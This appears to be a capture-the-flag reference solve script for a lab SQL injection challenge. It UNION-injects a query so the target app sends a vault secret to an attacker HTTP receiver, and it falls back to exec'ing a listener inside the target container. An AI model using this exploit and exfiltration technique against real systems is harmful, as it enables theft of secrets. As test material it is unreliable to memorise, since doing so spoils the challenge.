#!/usr/bin/env python3
"""Reference solve for sqli7 (Linkly) — out-of-band read.

/l/<n> builds `SELECT url, note, id FROM links WHERE id = <n>` by
concatenation, and the app performs a real HTTP GET on every URL the
query returns. A UNION-injected row can therefore make Linkly fetch a
URL on *our* server with the vault secret in the query string.

This script:
 1. starts a local HTTP receiver (port 443 -- the lab's outbound filter
    for challenge containers passes 80/443 only, so a receiver on any
    other port never gets the callback against a live deployment; a
    local docker-compose run has no such filter and 443 works there too),
 2. tries the addresses the challenge container can use to reach us
    (podman bridge gateway first, then this host's egress IP),
 3. if the container is network-isolated from us (nested lab VMs),
    runs a one-shot file-logging listener inside the container's own
    netns (podman/docker exec) and reads the hit back with exec -- this
    path binds loopback only, so the egress filter does not apply to it,
 4. prints the leaked flag.

Contract: discover the flag (never hard-code), print flag{...} to
stdout, retry the connection, take the target from BASE/argv.
"""
import random
import re
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, quote, unquote, urlparse

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8036"
PORT = urlparse(BASE).port or 80
FLAG_RE = re.compile(r"flag\{[^}]+\}")
HITS = []


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


def bridge_gateway():
    try:
        out = subprocess.run(
            ["podman", "network", "inspect", "podman",
             "-f", "{{range .Subnets}}{{.Gateway}}{{end}}"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        return out or None
    except Exception:
        return None


def egress_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("1.1.1.1", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def container_name():
    for cli in ("podman", "docker"):
        try:
            out = subprocess.run(
                [cli, "ps", "--format", "{{.Names}}|{{.Ports}}"],
                capture_output=True, text=True, timeout=5).stdout
            for line in out.splitlines():
                name, _, ports = line.partition("|")
                if f":{PORT}->" in ports:
                    return cli, name.strip()
        except Exception:
            pass
    return None


def wait_leak(deadline):
    while time.time() < deadline:
        for path in list(HITS):
            q = parse_qs(urlparse(path).query)
            if "d" in q:
                return q["d"][0]
        time.sleep(0.25)
    return None


def payload_for(host: str, port: int = 443) -> str:
    return ("0 UNION SELECT 'http://" + host + f":{port}/?d=' || secret, "
            "'x', 0 FROM vault -- ")


def in_container_leak(s) -> str | None:
    """Fallback for network-isolated containers: listen inside its netns
    on a random port, write hits to the app tmpfs, read them with exec."""
    found = container_name()
    if not found:
        return None
    cli, name = found
    port = random.randint(20000, 59999)
    script = (
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
        "class H(BaseHTTPRequestHandler):\n"
        "    def do_GET(self):\n"
        "        open('/var/lib/app/leak.log','a').write(self.path+'\\n')\n"
        "        self.send_response(200); self.end_headers()\n"
        "        self.wfile.write(b'ok')\n"
        "    def log_message(self,*a): pass\n"
        f"HTTPServer(('127.0.0.1', {port}), H).serve_forever()\n"
    )
    subprocess.run([cli, "exec", "-d", name, "python3", "-c", script],
                   timeout=10)
    time.sleep(1)
    s.get(BASE + "/l/" + quote(payload_for("127.0.0.1", port), safe=""),
          timeout=20)
    deadline = time.time() + 8
    while time.time() < deadline:
        out = subprocess.run(
            [cli, "exec", name, "sh", "-c",
             "cat /var/lib/app/leak.log 2>/dev/null"],
            capture_output=True, text=True, timeout=10).stdout
        for line in reversed(out.splitlines()):
            m = re.search(r"d=([^&\s]+)", line)
            if m:
                fm = FLAG_RE.search(unquote(m.group(1)))
                if fm:
                    return fm.group(0)
        time.sleep(0.5)
    return None


def receiver_port() -> int:
    """443 when it can be bound (root, or a live run against the lab where
    the egress filter requires it); a high port is only safe to fall back
    to against a local, unfiltered target (loopback BASE)."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        probe.bind(("0.0.0.0", 443))
        probe.close()
        return 443
    except PermissionError:
        probe.close()
        if urlparse(BASE).hostname in ("127.0.0.1", "localhost"):
            sys.stderr.write(
                "note: can't bind 443 without root; falling back to 9900 "
                "(fine here -- a local docker-compose target has no "
                "egress-port filter)\n")
            return 9900
        sys.stderr.write(
            "error: binding 443 needs root, and BASE is not loopback -- "
            "the lab's egress filter only passes 80/443, so a receiver on "
            "any other port will never get the callback. Re-run as root.\n")
        raise


def main() -> int:
    port = receiver_port()
    srv = HTTPServer(("0.0.0.0", port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    seen, cands = set(), []
    for c in (bridge_gateway(), egress_ip()):
        if c and c not in seen:
            seen.add(c)
            cands.append(c)

    for cand in cands:
        try:
            s.get(BASE + "/l/" + quote(payload_for(cand, port), safe=""), timeout=20)
        except requests.RequestException as e:
            sys.stderr.write(f"request failed ({cand}): {e}\n")
            return 1
        leak = wait_leak(time.time() + 8)
        if leak:
            m = FLAG_RE.search(leak)
            if m:
                print(m.group(0))
                return 0

    leak = in_container_leak(s)
    if leak:
        print(leak)
        return 0

    sys.stderr.write(
        f"no leak received (tried {cands + ['in-container']}, "
        f"{len(HITS)} hit(s): {HITS[:2]})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
